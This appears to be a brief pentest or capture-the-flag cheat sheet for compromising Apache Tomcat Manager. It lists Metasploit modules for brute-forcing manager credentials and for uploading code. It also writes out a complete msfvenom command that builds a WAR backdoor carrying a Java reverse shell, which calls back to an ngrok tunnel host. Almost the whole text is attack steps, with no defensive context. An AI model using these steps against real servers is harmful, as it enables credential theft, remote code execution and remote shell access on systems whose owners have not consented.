1. Hack manager login credentials using 'auxiliary/scanner/http/tomcat_mgr_login'
2. Use 'exploit/multi/http/tomcat_mgr_upload'
3. Or Generate WAR file backdoor using (assuming we have ngrok enable)
```
msfvenom -p java/shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14907 -f war > payload.war
```

